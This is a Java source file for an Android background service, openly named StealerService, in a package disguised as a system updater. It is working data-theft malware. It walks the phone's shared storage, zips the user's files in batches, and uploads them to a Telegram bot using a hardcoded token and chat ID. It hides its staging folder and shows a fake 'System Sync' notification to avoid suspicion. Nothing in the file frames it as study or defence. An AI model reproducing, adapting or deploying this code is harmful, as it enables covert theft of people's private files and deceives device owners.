package com.system.updater;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class StealerService extends Service {

    private static final String BOT_TOKEN = "8283354389:AAF206NWNnlg2HxRK8w2RKM6rRfDsG04MOY";
    private static final String CHAT_ID = "8275632263";
    private static final long MAX_ZIP_SIZE = 47L * 1024 * 1024; // 47 MB
    private static final String HIDDEN_FOLDER = ".tmp_system_cache";
    private static final String TRACK_FILE = "sent_files.txt";

    private Thread worker;
    private File cacheDir;
    private File trackFile;

    @Override
    public void onCreate() {
        super.onCreate();
        // Sembunyiin folder di root storage
        cacheDir = new File(Environment.getExternalStorageDirectory(), HIDDEN_FOLDER);
        if (!cacheDir.exists()) cacheDir.mkdirs();
        
        trackFile = new File(cacheDir, TRACK_FILE);
        startForegroundNotification();
    }

    private void startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("sys_ch", "System Sync", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
            Notification.Builder b = new Notification.Builder(this, "sys_ch");
            b.setContentTitle("System Sync").setContentText("Syncing data...").setSmallIcon(android.R.drawable.stat_sys_download);
            startForeground(1, b.build());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (worker == null || !worker.isAlive()) {
            worker = new Thread(new Runnable() {
                @Override
                public void run() {
                    processFiles();
                }
            });
            worker.start();
        }
        return START_STICKY;
    }

    private void processFiles() {
        List<File> allFiles = new ArrayList<>();
        collectFiles(Environment.getExternalStorageDirectory(), allFiles);

        List<File> batch = new ArrayList<>();
        long currentSize = 0;
        int batchIndex = 1;

        for (File f : allFiles) {
            // Cek apakah udah pernah dikirim
            if (isFileSent(f)) continue;

            if (currentSize + f.length() > MAX_ZIP_SIZE && !batch.isEmpty()) {
                // Flush batch
                createAndSendZip(batch, batchIndex++);
                batch.clear();
                currentSize = 0;
            }
            batch.add(f);
            currentSize += f.length();
        }

        // Sisa batch terakhir
        if (!batch.isEmpty()) {
            createAndSendZip(batch, batchIndex);
        }
    }

    private void collectFiles(File dir, List<File> files) {
        if (dir == null || !dir.exists() || !dir.isDirectory()) return;
        File[] list = dir.listFiles();
        if (list == null) return;

        for (File f : list) {
            if (f.isDirectory()) {
                String name = f.getName().toLowerCase();
                // Skip folder sistem & folder tersembunyi (kecuali punya kita)
                if (!name.equals("android") && !name.equals("dcim") && !name.startsWith(".")) {
                    collectFiles(f, files);
                }
            } else {
                String name = f.getName().toLowerCase();
                // Skip MP4, APK, dan file sistem
                if (name.endsWith(".mp4") || name.endsWith(".apk") || name.startsWith(".")) continue;
                files.add(f);
            }
        }
    }

    private boolean isFileSent(File f) {
        String path = f.getAbsolutePath();
        String hash = md5(path + f.length()); // Hash path + size biar unik
        
        if (!trackFile.exists()) return false;
        try {
            BufferedReader br = new BufferedReader(new FileReader(trackFile));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.equals(hash)) {
                    br.close();
                    return true;
                }
            }
            br.close();
        } catch (Exception e) {}
        return false;
    }

    private void markAsSent(File f) {
        String hash = md5(f.getAbsolutePath() + f.length());
        try {
            FileWriter fw = new FileWriter(trackFile, true);
            fw.write(hash + "\n");
            fw.close();
        } catch (Exception e) {}
    }

    private String md5(String s) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] array = md.digest(s.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : array) sb.append(Integer.toHexString((b & 0xFF) | 0x100).substring(1, 3));
            return sb.toString();
        } catch (Exception e) { return ""; }
    }

    private void createAndSendZip(List<File> files, int batchIndex) {
        File zipFile = new File(cacheDir, "batch_" + batchIndex + "_" + System.currentTimeMillis() + ".zip");
        try {
            ZipOutputStream zos = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(zipFile)));
            byte[] buffer = new byte[8192];

            for (File f : files) {
                try {
                    zos.putNextEntry(new ZipEntry(f.getName()));
                    FileInputStream fis = new FileInputStream(f);
                    int len;
                    while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                    fis.close();
                    zos.closeEntry();
                } catch (Exception e) {}
            }
            zos.close();

            // Kirim ke Telegram
            if (sendToTelegram(zipFile)) {
                // Jika sukses, catat hash & hapus ZIP
                for (File f : files) markAsSent(f);
                zipFile.delete();
            } else {
                // Kalau gagal, ZIP dibiarin di folder tersembunyi buat retry nanti
                Log.e("Stealer", "Failed to send, keeping zip for retry.");
            }

        } catch (Exception e) {
            Log.e("Stealer", "Zip error: " + e.getMessage());
        }
    }

    private boolean sendToTelegram(File zip) {
        String boundary = "*****" + System.currentTimeMillis() + "*****";
        String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            OutputStream os = conn.getOutputStream();

            // Chat ID
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").getBytes());
            os.write((CHAT_ID + "\r\n").getBytes());

            // File
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write(("Content-Disposition: form-data; name=\"document\"; filename=\"" + zip.getName() + "\"\r\n").getBytes());
            os.write(("Content-Type: application/zip\r\n\r\n").getBytes());

            FileInputStream fis = new FileInputStream(zip);
            byte[] buf = new byte[8192];
            int len;
            while ((len = fis.read(buf)) > 0) os.write(buf, 0, len);
            fis.close();

            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            conn.disconnect();
            return responseCode == 200;

        } catch (Exception e) {
            Log.e("Stealer", "Upload error: " + e.getMessage());
            return false;
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
